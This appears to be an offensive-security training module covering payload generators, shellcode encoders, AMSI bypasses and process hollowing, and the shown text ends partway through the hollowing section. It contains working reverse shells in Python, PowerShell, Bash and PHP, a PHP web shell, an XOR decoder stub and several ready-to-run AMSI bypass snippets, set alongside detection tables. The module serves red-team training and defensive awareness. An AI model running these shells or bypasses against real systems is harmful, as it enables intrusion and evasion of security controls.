# Payload Generation and Evasion Masterclass

**Module Version:** 1.0
**Classification:** Training Material - Authorized Use Only
**Target Audience:** Intermediate to Advanced Security Practitioners
**Estimated Duration:** 8-10 hours

---

## Table of Contents

1. [Module Overview](#module-overview)
2. [Payload Development Theory](#payload-development-theory)
3. [Payload Generator Mastery](#payload-generator-mastery)
4. [Shellcode Encoding Techniques](#shellcode-encoding-techniques)
5. [AMSI Bypass Techniques](#amsi-bypass-techniques)
6. [Process Hollowing Education](#process-hollowing-education)
7. [EDR Evasion Toolkit](#edr-evasion-toolkit)
8. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
9. [Hands-On Labs](#hands-on-labs)
10. [Assessment and Validation](#assessment-and-validation)

---

## Module Overview

### Purpose

This masterclass provides comprehensive training on payload generation and evasion techniques used in authorized penetration testing and red team operations. Students will gain deep understanding of how defensive mechanisms work and how they can be tested for effectiveness.

### Learning Objectives

Upon completion of this module, students will be able to:

1. Understand the theoretical foundations of payload development and detection evasion
2. Generate various payload types using the payload-generator tool
3. Apply multiple shellcode encoding techniques for signature evasion
4. Implement AMSI bypass techniques in Windows environments
5. Understand process hollowing concepts and detection opportunities
6. Apply EDR evasion techniques including direct syscalls and unhooking
7. Map techniques to MITRE ATT&CK framework for reporting

### Prerequisites

- Understanding of basic networking concepts (TCP/IP, ports, sockets)
- Familiarity with at least one scripting language (Python, PowerShell, or Bash)
- Basic knowledge of Windows internals and memory management
- Understanding of x86/x64 assembly fundamentals
- Experience with command-line interfaces

### Legal Disclaimer

```
IMPORTANT: All tools and techniques covered in this training are for
AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.

Unauthorized use of these techniques against systems you do not own
or have explicit written permission to test is ILLEGAL and UNETHICAL.

Always obtain proper authorization before conducting any security testing.
```

---

## Payload Development Theory

### What is a Payload?

In the context of offensive security, a **payload** is the code that executes on a target system after successful exploitation. The payload performs the actual malicious action desired by the attacker, whether that is establishing remote access, exfiltrating data, or executing commands.

Payloads exist on a spectrum from simple to complex:

```
+-------------------+----------------------+------------------------+
|    SIMPLE         |     MODERATE         |      COMPLEX           |
+-------------------+----------------------+------------------------+
| Command execution | Reverse shells       | Full-featured implants |
| File operations   | Bind shells          | C2 frameworks          |
| Information       | Web shells           | Custom RATs            |
| gathering         | Downloaders          | Persistence mechanisms |
+-------------------+----------------------+------------------------+
```

### Payload Types and Their Purposes

**1. Reverse Shells**

A reverse shell connects back from the target to the attacker's listener. This is the most common payload type because it works through NAT and firewalls that allow outbound connections.

```
                    REVERSE SHELL FLOW

+----------------+                    +------------------+
|    ATTACKER    |<-------------------|     TARGET       |
|   (Listener)   |   TCP Connection   | (Initiates conn) |
|  192.168.1.10  |   Port 4444        |   10.0.0.50      |
+----------------+                    +------------------+
        |                                     |
        |  1. Attacker starts listener        |
        |  2. Target executes payload         |
        |  3. Target connects to attacker     |
        |  4. Shell I/O over connection       |
        +-------------------------------------+
```

**2. Bind Shells**

A bind shell listens on the target system, waiting for the attacker to connect. This is useful when the target cannot initiate outbound connections.

```
                    BIND SHELL FLOW

+----------------+                    +------------------+
|    ATTACKER    |------------------->|     TARGET       |
|  (Initiates)   |   TCP Connection   |   (Listener)     |
|  192.168.1.10  |   Port 4444        |   10.0.0.50      |
+----------------+                    +------------------+
        |                                     |
        |  1. Target starts listener          |
        |  2. Attacker connects to target     |
        |  3. Shell I/O over connection       |
        +-------------------------------------+
```

**3. Web Shells**

Web shells are server-side scripts that provide command execution through HTTP requests. They are deployed on web servers and accessed through a browser or HTTP client.

```
                    WEB SHELL ARCHITECTURE

+----------------+         HTTP          +------------------+
|    ATTACKER    |---------------------->|   WEB SERVER     |
|    Browser     |  GET /shell.php?cmd=  |   shell.php      |
+----------------+         |             +------------------+
        ^                  |                      |
        |                  v                      v
        |         +------------------+    +---------------+
        +---------|   HTTP Response  |<---|  OS Command   |
                  |   Command Output |    |   Execution   |
                  +------------------+    +---------------+
```

### Encoding vs Encryption vs Obfuscation

Understanding the distinction between these three concepts is critical for effective evasion:

**Encoding** is a reversible transformation that converts data from one format to another. It is NOT meant for security - anyone can decode it. Examples include Base64, URL encoding, and hex encoding.

```
Original:    calc.exe
Base64:      Y2FsYy5leGU=
Hex:         63616c632e657865

Purpose: Avoid bad characters, enable transport through text-only channels
Security: NONE - easily reversible
```

**Encryption** uses mathematical algorithms and keys to protect data confidentiality. Only someone with the correct key can decrypt the data.

```
Original:    calc.exe
AES Key:     s3cr3tk3y123456!
Encrypted:   [binary data requiring key to decrypt]

Purpose: Protect payload confidentiality
Security: HIGH - requires key to decrypt
```

**Obfuscation** transforms code to make it difficult for humans and automated tools to understand, while preserving functionality.

```
Original PowerShell:
    Invoke-Expression "calc.exe"

Obfuscated:
    &("{1}{0}{2}"-f'ke-Expre','Invo','ssion') ("{0}{2}{1}"-f'cal','xe','c.e')

Purpose: Evade signature-based detection
Security: LOW - determined analyst can deobfuscate
```

### Detection Mechanisms Deep Dive

Modern systems employ multiple layers of detection that payloads must consider:

**Antivirus (AV) Detection Methods:**

```
+--------------------------------------------------------------------+
|                    ANTIVIRUS DETECTION LAYERS                       |
+--------------------------------------------------------------------+
|                                                                     |
|  1. SIGNATURE-BASED                                                 |
|     +------------------+                                            |
|     | Known bad bytes  |---> Hash matching, pattern matching        |
|     | File signatures  |---> YARA rules, byte sequences             |
|     | Import tables    |---> Suspicious API combinations            |
|     +------------------+                                            |
|                                                                     |
|  2. HEURISTIC-BASED                                                 |
|     +------------------+                                            |
|     | Code structure   |---> Entropy analysis, packer detection     |
|     | Behavior hints   |---> API call patterns, string analysis     |
|     | Statistical      |---> Machine learning models                |
|     +------------------+                                            |
|                                                                     |
|  3. BEHAVIOR-BASED                                                  |
|     +------------------+                                            |
|     | Runtime monitor  |---> API hooking, sandbox execution         |
|     | Process actions  |---> File/registry/network activity         |
|     | Memory analysis  |---> Shellcode patterns, RWX regions        |
|     +------------------+                                            |
|                                                                     |
+--------------------------------------------------------------------+
```

**Endpoint Detection and Response (EDR):**

EDRs go beyond traditional AV by providing continuous monitoring and response capabilities:

```
                    EDR ARCHITECTURE

+-------------------+     +-------------------+     +------------------+
|   Kernel Driver   |     |  User-Mode Agent  |     |   Cloud Backend  |
+-------------------+     +-------------------+     +------------------+
        |                         |                         |
        v                         v                         v
+-------------------+     +-------------------+     +------------------+
| Process callbacks |     | API hooking       |     | Threat intel     |
| Registry notify   |     | ETW consumption   |     | ML models        |
| File system mini  |     | Memory scanning   |     | Correlation      |
| Network filtering |     | DLL injection     |     | Alerting         |
+-------------------+     +-------------------+     +------------------+
```

**AMSI (Antimalware Scan Interface):**

AMSI is a Windows interface that allows applications to request content scanning before execution:

```
                    AMSI SCANNING FLOW

+----------------+    +----------------+    +------------------+
|  PowerShell    |--->|     AMSI       |--->|   AV Engine      |
|  Script Host   |    |   Interface    |    |   (Defender)     |
+----------------+    +----------------+    +------------------+
        |                    |                      |
        |  1. Script content |                      |
        |     sent to AMSI   |                      |
        |                    |  2. AMSI calls       |
        |                    |     registered AV    |
        |                    |                      |
        |                    |  3. AV returns       |
        |                    |     CLEAN/MALWARE    |
        |                    |                      |
        |  4. If MALWARE,    |                      |
        |     block execution|                      |
        +--------------------+----------------------+

AMSI-Aware Applications:
- PowerShell (script blocks, commands)
- Windows Script Host (VBScript, JScript)
- Office VBA Macros
- .NET (Assembly.Load, dynamic code)
- WMI
```

### The Evasion Mindset

Effective evasion requires understanding detection from the defender's perspective:

```
+--------------------------------------------------------------------+
|                    EVASION STRATEGY FRAMEWORK                       |
+--------------------------------------------------------------------+
|                                                                     |
|  PRINCIPLE 1: BLEND IN                                              |
|    - Use legitimate processes and tools                             |
|    - Match expected behavior patterns                               |
|    - Avoid anomalous characteristics                                |
|                                                                     |
|  PRINCIPLE 2: LAYER DEFENSES                                        |
|    - Combine multiple evasion techniques                            |
|    - No single technique is reliable alone                          |
|    - Defense in depth works both ways                               |
|                                                                     |
|  PRINCIPLE 3: UNDERSTAND THE DEFENDER                               |
|    - Know what triggers alerts                                      |
|    - Study detection signatures                                     |
|    - Test before deployment                                         |
|                                                                     |
|  PRINCIPLE 4: MINIMIZE ARTIFACTS                                    |
|    - Reduce disk writes                                             |
|    - Clean up after operations                                      |
|    - Use memory-only techniques when possible                       |
|                                                                     |
+--------------------------------------------------------------------+
```

---

## Payload Generator Mastery

### Tool Overview

The Payload Generator tool creates various shell payloads for different languages and platforms. It supports reverse shells, bind shells, and web shells with configurable encoding and obfuscation levels.

**Tool Location:** `/Users/ic/cptc11/python/tools/payload-generator/payload_generator.py`

### Architecture

```
                    PAYLOAD GENERATOR ARCHITECTURE

+-------------------------------------------------------------------------+
|                         PayloadGenerator                                  |
+-------------------------------------------------------------------------+
|                                                                          |
|  +------------------+    +------------------+    +------------------+     |
|  |  PayloadConfig   |    |  PayloadTemplate |    |  PayloadOutput   |     |
|  +------------------+    +------------------+    +------------------+     |
|  | payload_type     |    | generate()       |    | payload          |     |
|  | language         |    | get_notes()      |    | language         |     |
|  | lhost/lport      |    | get_detection_   |    | encoding         |     |
|  | encoding         |    |   vectors()      |    | notes            |     |
|  | obfuscation_level|    +------------------+    | detection_       |     |
|  | platform         |            ^               |   considerations |     |
|  +------------------+            |               +------------------+     |
|                                  |                                        |
|  Templates:                      |                                        |
|  +------------------------------+|                                        |
|  | PythonReverseShell    +------+                                        |
|  | PowerShellReverseShell+------+                                        |
|  | BashReverseShell      +------+                                        |
|  | PHPReverseShell       +------+                                        |
|  | PHPWebShell           +------+                                        |
|  | PythonBindShell       +------+                                        |
|  +------------------------------+                                        |
|                                                                          |
+-------------------------------------------------------------------------+
```

### Shell Types Explained

**Reverse Shells**

The attacker sets up a listener, and the payload connects back. This is preferred because:
- Works through NAT (target initiates connection)
- Bypasses inbound firewall rules
- Attacker controls the listener environment

Available languages for reverse shells:
- Python (cross-platform)
- PowerShell (Windows)
- Bash (Linux/Unix)
- PHP (web servers)

**Bind Shells**

The payload opens a port and waits for connections. Use cases:
- Target cannot make outbound connections
- Attacker has direct network access to target
- Persistent backdoor scenarios

**Web Shells**

Server-side scripts for command execution via HTTP:
- Accessible through web browser
- Commands passed via GET/POST parameters
- Output returned in HTTP response

### Language Options Deep Dive

**Python Payloads**

Python reverse shells are highly portable and work on any system with Python installed:

```python
# Basic Python Reverse Shell Structure
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT))
os.dup2(s.fileno(),0)  # stdin
os.dup2(s.fileno(),1)  # stdout
os.dup2(s.fileno(),2)  # stderr
subprocess.call(["/bin/sh","-i"])
```

Detection considerations:
- Network connection to external IP
- Process spawning /bin/sh
- File descriptor duplication syscalls
- Known payload signatures in memory

**PowerShell Payloads**

PowerShell is ubiquitous on Windows and provides powerful capabilities:

```powershell
# Basic PowerShell Reverse Shell Structure
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

Detection considerations:
- AMSI scanning
- PowerShell script block logging
- Network connection monitoring
- TCPClient class usage
- Invoke-Expression (iex) usage

**Bash Payloads**

Simple and effective on Linux systems with bash:

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Alternative with file descriptor manipulation
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
```

Detection considerations:
- /dev/tcp access monitoring
- Outbound connection from shell process
- File descriptor redirection patterns

**PHP Payloads**

For web server compromise:

```php
<?php
// Simple web shell
system($_GET["cmd"]);

// Reverse shell
$sock=fsockopen("LHOST",LPORT);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

### Obfuscation Levels

The tool supports four obfuscation levels (0-3):

**Level 0 - No Obfuscation**
- Raw, readable payload
- Maximum compatibility
- Easily detected by signatures

**Level 1 - Basic Obfuscation**
- String splitting for sensitive terms
- Import obfuscation (Python)
- String concatenation (PowerShell)

**Level 2 - Intermediate Obfuscation**
- Variable name randomization
- Additional string encoding
- Control flow modifications

**Level 3 - Advanced Obfuscation**
- Multiple encoding layers
- Dead code insertion
- Format string operations

```
OBFUSCATION PROGRESSION EXAMPLE (PowerShell)

Level 0:
  $client = New-Object System.Net.Sockets.TCPClient

Level 1:
  $client = New-Object Sys'+'tem.Net.Soc'+'kets.TCP'+'Client

Level 2:
  $kxmwqp = New-Object ('Sys'+'tem.Net.Soc'+'kets.TCP'+'Client')

Level 3:
  $kxmwqp = &('{0}{1}'-f'New-','Object') ('{2}{0}{1}'-f'Net.Sock','ets.TCPClient','System.')
```

### Staged vs Stageless Payloads

**Stageless Payloads**
- Complete, self-contained payload
- Larger size but simpler deployment
- Single execution provides full capability

```
+------------------+
|  STAGELESS       |
|  PAYLOAD         |
|  +------------+  |
|  | Full shell |  |
|  | code       |  |
|  | All        |  |
|  | features   |  |
|  +------------+  |
+------------------+
     Single File
```

**Staged Payloads**
- Small initial stager
- Downloads full payload after execution
- Smaller initial footprint

```
STAGED PAYLOAD FLOW

Stage 0                  Stage 1                  Stage 2
(Stager)                 (Download)               (Full Payload)
+--------+               +--------+               +--------+
| Small  |--Connect to-->| C2     |--Download---->| Full   |
| loader |   attacker    | Server |   stage 2     | shell  |
+--------+               +--------+               +--------+
   ~500                                             ~50KB+
   bytes
```

### Command Reference

```bash
# List available payloads
python payload_generator.py --list

# Generate Python reverse shell
python payload_generator.py --type reverse_shell --lang python \
    --lhost 192.168.1.10 --lport 4444

# Generate PowerShell with obfuscation and base64 encoding
python payload_generator.py --type reverse_shell --lang powershell \
    --lhost 192.168.1.10 --lport 443 --obfuscate 2 --encoding base64

# Generate PHP web shell with obfuscation
python payload_generator.py --type web_shell --lang php --obfuscate 3

# Plan mode - see what would be generated
python payload_generator.py --type reverse_shell --lang bash \
    --lhost 10.0.0.1 --plan

# JSON output for automation
python payload_generator.py --type reverse_shell --lang python \
    --lhost 192.168.1.10 --json
```

---

## Shellcode Encoding Techniques

### Tool Overview

The Shellcode Encoder transforms raw shellcode using various encoding techniques to evade signature-based detection. Understanding these encodings is essential for both offensive operations and defensive analysis.

**Tool Location:** `/Users/ic/cptc11/python/tools/shellcode-encoder/shellcode_encoder.py`

### Encoding Architecture

```
                    SHELLCODE ENCODING PIPELINE

+-------------+    +-------------+    +-------------+    +-------------+
|   Input     |    |   Encoder   |    |  Encoded    |    |   Output    |
|  Shellcode  |--->|   Engine    |--->|  Shellcode  |--->|  + Decoder  |
+-------------+    +-------------+    +-------------+    +-------------+
                         |
         +---------------+---------------+
         |               |               |
    +----v----+    +-----v-----+    +----v----+
    | XOR     |    | Rolling   |    | RC4     |
    | Encoder |    | XOR       |    | Encoder |
    +---------+    +-----------+    +---------+
```

### XOR Encoding Explained

XOR encoding is the simplest and most common shellcode encoding technique. It applies the XOR operation between each byte of shellcode and a key.

**XOR Properties:**
- A XOR B = C
- C XOR B = A (self-inverting)
- Same operation for encode and decode

```
XOR ENCODING EXAMPLE

Original byte:  0x48 (01001000)
Key:            0xAA (10101010)
                ----------------
Encoded:        0xE2 (11100010)

Decoding:
Encoded:        0xE2 (11100010)
Key:            0xAA (10101010)
                ----------------
Original:       0x48 (01001000)
```

**XOR Encoder Implementation:**

```python
def xor_encode(shellcode: bytes, key: bytes) -> bytes:
    encoded = bytearray()
    key_len = len(key)
    for i, byte in enumerate(shellcode):
        encoded.append(byte ^ key[i % key_len])
    return bytes(encoded)
```

**XOR Decoder Stub (x86 Assembly):**

```nasm
; XOR Decoder Stub (x86)
; Key: 0xAA
; Length: 256 bytes

decoder:
    jmp short get_shellcode
decode_routine:
    pop esi                     ; Get shellcode address
    xor ecx, ecx
    mov cl, 0xFF                ; Shellcode length (255 max for cl)
decode_loop:
    xor byte [esi], 0xAA        ; XOR with key
    inc esi
    loop decode_loop
    jmp short shellcode
get_shellcode:
    call decode_routine
shellcode:
    ; Encoded shellcode follows here
```

### Rolling XOR for Polymorphism

Rolling XOR creates a more complex encoding where each byte affects the key for the next byte, creating polymorphic output.

```
ROLLING XOR ALGORITHM

Initial Key: K0

Byte 0: encoded[0] = plaintext[0] XOR K0
        K1 = (K0 + plaintext[0]) AND 0xFF

Byte 1: encoded[1] = plaintext[1] XOR K1
        K2 = (K1 + plaintext[1]) AND 0xFF

Byte n: encoded[n] = plaintext[n] XOR Kn
        K(n+1) = (Kn + plaintext[n]) AND 0xFF
```

**Rolling XOR Visualization:**

```
                    ROLLING XOR FLOW

Plaintext:    [0x48] [0x65] [0x6C] [0x6C] [0x6F]
                |      |      |      |      |
Key Stream:   [0xAA] [0xF2] [0x57] [0xC3] [0x2F]
                |      |      |      |      |
              XOR    XOR    XOR    XOR    XOR
                |      |      |      |      |
Encoded:      [0xE2] [0x97] [0x3B] [0xAF] [0x40]

Key Evolution:
K0 = 0xAA
K1 = (0xAA + 0x48) & 0xFF = 0xF2
K2 = (0xF2 + 0x65) & 0xFF = 0x57
K3 = (0x57 + 0x6C) & 0xFF = 0xC3
K4 = (0xC3 + 0x6C) & 0xFF = 0x2F
```

### ADD, ROT, and RC4 Encoders

**ADD Encoder**

Adds a constant value to each byte (decoded by subtracting):

```python
def add_encode(shellcode: bytes, key: int) -> bytes:
    encoded = bytearray()
    for byte in shellcode:
        encoded.append((byte + key) & 0xFF)
    return bytes(encoded)
```

**ROT Encoder (Caesar Cipher)**

Rotates each byte by a fixed amount:

```python
def rot_encode(shellcode: bytes, rotation: int) -> bytes:
    encoded = bytearray()
    for byte in shellcode:
        encoded.append((byte + rotation) % 256)
    return bytes(encoded)
```

**RC4 Encoder**

RC4 is a stream cipher that provides stronger encoding:

```
RC4 ALGORITHM OVERVIEW

1. Key Scheduling Algorithm (KSA):
   - Initialize S-box (256-byte array)
   - Permute based on key

2. Pseudo-Random Generation Algorithm (PRGA):
   - Generate keystream bytes
   - XOR with plaintext

+--------+     +--------+     +--------+
|  Key   |---->|  KSA   |---->| S-box  |
+--------+     +--------+     +--------+
                                  |
                                  v
+--------+     +--------+     +--------+
| Plain  |---->|  PRGA  |---->|Encoded |
| text   |     |  XOR   |     |  text  |
+--------+     +--------+     +--------+
```

### Chain Encoding for Layered Evasion

Chain encoding applies multiple encoders in sequence, creating layered protection:

```
CHAIN ENCODING FLOW

Original        XOR           ADD           ROT           Final
Shellcode  -->  Encoder  -->  Encoder  -->  Encoder  -->  Output
   |              |             |             |             |
   |         Key: 0xAA     Key: 0x05     Rot: 13          |
   |              |             |             |             |
   +--------------|-------------|-------------|-------------+
                  |             |             |
              Layer 1       Layer 2       Layer 3
```

**Chain Decoding Order:**

Decoders must execute in reverse order:
1. ROT decoder (rotation -13)
2. ADD decoder (subtract 0x05)
3. XOR decoder (key 0xAA)
4. Original shellcode executes

### Bad Character Handling

Certain bytes can break payload delivery:

```
COMMON BAD CHARACTERS

0x00 (NULL)     - String terminator
0x0A (LF)       - Newline
0x0D (CR)       - Carriage return
0x20 (Space)    - Command separator
0x22 (")        - String delimiter
0x27 (')        - String delimiter
0x5C (\)        - Escape character
```

**Automatic Bad Character Avoidance:**

```
BAD CHARACTER HANDLING ALGORITHM

1. For each potential key:
   a. Encode shellcode with key
   b. Check if encoded output contains bad chars
   c. If clean, use this key
   d. If not, try next key

2. If no single-byte key works:
   a. Try multi-byte keys
   b. Or use different encoder type
```

### Decoder Stub Generation

Each encoding type requires a corresponding decoder stub that prepends the encoded shellcode:

```
ENCODED PAYLOAD STRUCTURE

+------------------+------------------+
|  Decoder Stub    | Encoded Shellcode|
+------------------+------------------+
|                  |                  |
| - Find shellcode | - Encoded bytes  |
| - Apply decode   | - Requires key   |
| - Jump to start  | - Bad chars free |
|                  |                  |
+------------------+------------------+
     ~20-50 bytes       Variable

EXECUTION FLOW:
1. Decoder stub executes
2. Locates encoded shellcode (usually via call/pop)
3. Decodes in place
4. Jumps to decoded shellcode
5. Original payload executes
```

### Command Reference

```bash
# Basic XOR encoding
python shellcode_encoder.py --input shellcode.bin --encoding xor

# XOR with specific key
python shellcode_encoder.py --input sc.bin --encoding xor --key AA

# Rolling XOR for polymorphism
python shellcode_encoder.py --input sc.bin --encoding xor_rolling

# RC4 encryption
python shellcode_encoder.py --input sc.bin --encoding rc4 --key deadbeef

# Chain multiple encoders
python shellcode_encoder.py --input sc.bin --chain xor,add,rot

# Ensure null-free output
python shellcode_encoder.py --input sc.bin --encoding xor --null-free

# Specify bad characters to avoid
python shellcode_encoder.py --input sc.bin --encoding xor --bad-chars 000a0d20

# Output in C array format
python shellcode_encoder.py --input sc.bin --encoding xor --format c_array

# Analyze shellcode before encoding
python shellcode_encoder.py --input sc.bin --analyze

# Plan mode
python shellcode_encoder.py --input sc.bin --encoding rc4 --plan
```

---

## AMSI Bypass Techniques

### What is AMSI and How It Works

AMSI (Antimalware Scan Interface) is a Windows security feature introduced in Windows 10 that provides a standardized interface for applications to request content scanning by installed antimalware products.

**Tool Location:** `/Users/ic/cptc11/python/tools/amsi-bypass/amsi_bypass.py`

### AMSI Architecture

```
                    AMSI ARCHITECTURE OVERVIEW

+------------------------------------------------------------------+
|                        AMSI-AWARE APPLICATION                     |
|    (PowerShell, VBScript, JScript, Office VBA, WMI, .NET)        |
+------------------------------------------------------------------+
                              |
                    AmsiScanBuffer()
                    AmsiScanString()
                              |
                              v
+------------------------------------------------------------------+
|                          AMSI.DLL                                 |
|                    (Antimalware Scan Interface)                   |
+------------------------------------------------------------------+
                              |
                    IAntimalwareProvider
                              |
                              v
+------------------------------------------------------------------+
|                     ANTIMALWARE PROVIDER                          |
|          (Windows Defender, Third-party AV products)             |
+------------------------------------------------------------------+
                              |
                    Scan Result (AMSI_RESULT)
                              |
                              v
+------------------------------------------------------------------+
|                      APPLICATION RESPONSE                         |
|              (Block execution if malware detected)               |
+------------------------------------------------------------------+
```

### AMSI Scan Flow

```
AMSI SCANNING SEQUENCE

1. User enters PowerShell command:
   > Invoke-Mimikatz

2. PowerShell calls AmsiScanBuffer():
   +------------------+
   | AmsiScanBuffer() |
   | - Buffer: "Invoke-Mimikatz"
   | - Length: 15
   | - Context: session context
   +------------------+

3. AMSI.DLL routes to registered provider:
   +------------------+
   | Defender Engine  |
   | - Pattern match  |
   | - ML analysis    |
   | - Signature check|
   +------------------+

4. Provider returns result:
   AMSI_RESULT_DETECTED (malware found)

5. PowerShell blocks execution:
   "This script contains malicious content"
```

### Seven Bypass Techniques Explained

**Technique 1: AmsiScanBuffer Memory Patch**

Patches the AmsiScanBuffer function to return a clean result for all scans.

```
MEMORY PATCH TECHNIQUE

Before Patch:
+-----------------------+
| AmsiScanBuffer()      |
| [normal function code]|
| ...returns scan result|
+-----------------------+

After Patch:
+-----------------------+
| AmsiScanBuffer()      |
| mov eax, 0            | <- Returns S_OK (clean)
| ret                   | <- Immediately returns
| [dead code...]        |
+-----------------------+

Implementation:
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$c=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
$c.SetValue($null,[IntPtr]::Zero)
```

Risk Level: HIGH
Detection: Memory scanning, API hooking detection, ETW tracing

**Technique 2: Reflection Context Nullification**

Uses .NET reflection to null the AMSI context, causing initialization failure.

```
REFLECTION APPROACH

Target: System.Management.Automation.AmsiUtils
Field:  amsiContext (NonPublic, Static)
Action: Set to IntPtr.Zero

When amsiContext is null:
- AMSI thinks it's not initialized
- Scans are skipped
- Content passes through unscanned
```

**Technique 3: Force AMSI Initialization Error**

Sets the amsiInitFailed flag to true, telling PowerShell that AMSI failed to initialize.

```
INITIALIZATION FAILURE TECHNIQUE

$w = 'System.Management.Automation.A]'+'msiUtils'
$c = [Ref].Assembly.GetType($w)
$f = $c.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

Result:
- PowerShell thinks AMSI init failed
- No scans attempted
- All content executes
```

Risk Level: MEDIUM
Detection: amsiInitFailed field monitoring, reflection patterns

**Technique 4: PowerShell Downgrade**

Uses PowerShell version 2, which predates AMSI and has no scanning capability.

```
POWERSHELL DOWNGRADE

Command:
powershell -version 2 -command "malicious-code-here"

Requirements:
- .NET Framework 2.0/3.5 installed
- PowerShell v2 engine available
- Not available on modern Windows by default

Limitations:
- Easily detected via command line
- v2 lacks modern features
- Often disabled by policy
```

Risk Level: LOW
Detection: Process command line analysis, PowerShell version monitoring

**Technique 5: Constrained Language Mode Bypass**

Bypasses CLM restrictions to enable full PowerShell capabilities.

```
CLM BYPASS

$ExecutionContext.SessionState.LanguageMode = "FullLanguage"

Note: May not work if CLM is enforced by:
- AppLocker
- Windows Defender Application Control
- Group Policy
```

**Technique 6: Type Confusion Bypass**

Manipulates internal PowerShell state through type confusion.

```
TYPE CONFUSION TECHNIQUE

$t=[Type]('Sys'+'tem.Man'+'agement.Aut'+'omation.tic'+'Func'+'tions')
$t.GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null,@{})
$t.GetField('scanContent','NonPublic,Static').SetValue($null,2)

Risk: May cause PowerShell instability
```

**Technique 7: COM Object Approach**

Uses COM objects to execute code outside AMSI's scanning scope.

```
COM BYPASS CONCEPT

# Some COM objects can execute code without AMSI scanning
$com = New-Object -ComObject "legitimate.com.object"
# Use COM object capabilities to load/execute code
```

### Chain Generation for Reliability

Combining multiple bypass techniques increases reliability:

```
BYPASS CHAIN EXAMPLE

# Technique 1: Try initialization failure
try {
    $w = 'System.Management.Automation.A'+'msiUtils'
    $c = [Ref].Assembly.GetType($w)
    $f = $c.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
} catch {}

# Technique 2: Memory patch fallback
try {
    $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
    $c=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
    $c.SetValue($null,[IntPtr]::Zero)
} catch {}

# Payload executes with higher success rate
```

### Detection and Mitigation

**Detection Methods:**

| Bypass Type | Detection Approach |
|------------|-------------------|
| Memory Patching | ETW tracing, memory scanning, API hook verification |
| Reflection | .NET assembly monitoring, reflection call logging |
| Init Failure | Field value monitoring, AMSI health checks |
| PS Downgrade | Command line auditing, PowerShell version alerts |
| CLM Bypass | Language mode change logging, policy enforcement |

**Defensive Mitigations:**

1. Enable PowerShell Script Block Logging
2. Enable Module Logging
3. Monitor for AMSI-related function modifications
4. Use kernel-mode protections
5. Implement application whitelisting
6. Remove PowerShell v2 from systems

### Command Reference

```bash
# List available techniques
python amsi_bypass.py --list

# Plan mode - analyze technique without generating
python amsi_bypass.py --technique force_amsi_error --plan

# Generate bypass with obfuscation
python amsi_bypass.py --technique amsi_scan_buffer_patch --obfuscate 2

# Base64 encode for -enc delivery
python amsi_bypass.py --technique force_amsi_error --base64

# Generate multi-technique chain
python amsi_bypass.py --chain

# Filter by category
python amsi_bypass.py --list --category memory_patching

# JSON output
python amsi_bypass.py --technique force_amsi_error --json
```

---

## Process Hollowing Education

### Technique Explanation

Process hollowing is a code injection technique where a legitimate process is created in a suspended state, its memory is unmapped, and malicious code is written in its place. The process then resumes execution, running the injected code while appearing as a legitimate process.

**Tool Location:** `/Users/ic/cptc11/python/tools/process-hollowing/process_hollowing.py`

### The Eight Steps of Process Hollowing

```
                PROCESS HOLLOWING - 8 STEP OVERVIEW

+-------------------------------------------------------------------+
|  STEP 1: Create Suspended Process                                  |
|    CreateProcess() with CREATE_SUSPENDED flag                      |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 2: Query Process Information                                 |
|    NtQueryInformationProcess() to get PEB address                 |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 3: Unmap Original Image                                      |
|    NtUnmapViewOfSection() removes original executable             |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 4: Allocate New Memory                                       |
|    VirtualAllocEx() at original image base                        |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 5: Write Payload                                             |
|    WriteProcessMemory() - headers and sections                    |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 6: Fix Image Base in PEB                                     |
|    WriteProcessMemory() to update PEB.ImageBaseAddress            |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 7: Set Thread Context                                        |
|    GetThreadContext() / SetThreadContext() - update entry point   |
+-------------------------------------------------------------------+
                              |
                              v
+-------------------------------------------------------------------+
|  STEP 8: Resume Execution                                          |
|    ResumeThread() - malicious code executes                       |
+-------------------------------------------------------------------+
```

### Detailed Step Breakdown

**Step 1: Create Suspended Process**

```
CreateProcess() Parameters:

- lpApplicationName: Target process path (e.g., svchost.exe)
- lpCommandLine: Command line arguments
- dwCreationFlags: CREATE_SUSPENDED (0x4)
                   CREATE_NO_WINDOW (0x08000000)

Result:
- Process created but not running
- Main thread suspended at entry point
- Returns process and thread handles

API Prototype:
BOOL CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);
```

